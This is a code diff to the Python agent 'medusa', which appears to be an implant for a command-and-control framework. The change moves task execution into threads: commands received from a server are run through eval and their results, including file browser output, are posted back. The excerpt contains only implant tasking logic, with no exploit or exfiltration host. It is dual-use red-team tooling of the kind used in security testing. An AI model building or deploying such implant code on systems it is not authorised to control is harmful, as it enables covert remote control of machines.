@@ -1,6 +1,7 @@
 import os, random, sys, json, socket, base64, time, platform
 import urllib.request
 from datetime import datetime
+import threading
 
 s_box = (
     0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
@@ -279,43 +280,57 @@ class medusa:
         else: return data.decode()
 
     def postResponses(self):
-        responses = []
-        for task in self.taskings:
-            if task["completed"] == True:
-                out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
-                if task["error"]: out["status"] = "error"
-                elif "file_browser" in task["parameters"]: out["file_browser"] = task["file_browser"]
-                responses.append(out)
+        try:
+            responses = []
+            taskings = self.taskings
+            for task in taskings:
+                if task["completed"] == True:
+                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
+                    if task["error"]: out["status"] = "error"
+                    elif "file_browser" in task["parameters"]: out["file_browser"] = task["file_browser"]
+                    responses.append(out)
 
-        if (len(responses) > 0):
-            message = { "action": "post_response", "responses": responses }
-            response_data = self.postMessageAndRetrieveResponse(message)
-            for resp in response_data["responses"]:
-                self.taskings[:] = [t for t in self.taskings if not resp["task_id"] == t["task_id"] and not resp["status"] == "success"]
+            if (len(responses) > 0):
+                message = { "action": "post_response", "responses": responses }
+                response_data = self.postMessageAndRetrieveResponse(message)
+                for resp in response_data["responses"]:
+                    task_index = [t for t in self.taskings \
+                        if resp["task_id"] == t["task_id"] \
+                        and resp["status"] == "success"][0]
+                    self.taskings.pop(self.taskings.index(task_index))
+        except:
+            pass
+
+    def processTask(self, task):
+        try:
+            task["started"] = True
+            function = getattr(self, task["command"], None)
+            if(callable(function)):
+                try:
+                    params = json.loads(task["parameters"]) if task["parameters"] else {}
+                    params['task_id'] = task["task_id"] 
+                    command =  "self." + task["command"] + "(**params)"
+                    output = eval(command)
+                except Exception as error:
+                    output = str(error)
+                    task["error"] = True                        
+                task["result"] = output
+                task["completed"] = True
+            else:
+                task["error"] == task["completed"] == True
+                task["result"] = "Function unavailable."
+        except Exception as error:
+            task["error"] == task["completed"] == True
+            task["result"] = error
 
     def processTaskings(self):
-        for task in self.taskings:
-            try:
-                if task["started"] == False:
-                    task["started"] = True
-                    function = getattr(self, task["command"], None)
-                    if(callable(function)):
-                        try:
-                            params = json.loads(task["parameters"]) if task["parameters"] else {}
-                            params['task_id'] = task["task_id"] 
-                            command =  "self." + task["command"] + "(**params)"
-                            output = eval(command)
-                        except Exception as error:
-                            output = str(error)
-                            task["error"] = True                        
-                        task["result"] = output
-                        task["completed"] = True
-                    else:
-                        task["error"] == task["completed"] == True
-                        task["result"] = "Function unavailable."
-            except Exception as error:
-                task["error"] == task["completed"] == True
-                task["result"] = error
+        threads = list()       
+        taskings = self.taskings     
+        for task in taskings:
+            if task["started"] == False:
+                x = threading.Thread(target=self.processTask, args=(task,))
+                threads.append(x)
+                x.start()
 
     def getTaskings(self):
         data = { "action": "get_tasking", "tasking_size": -1 }
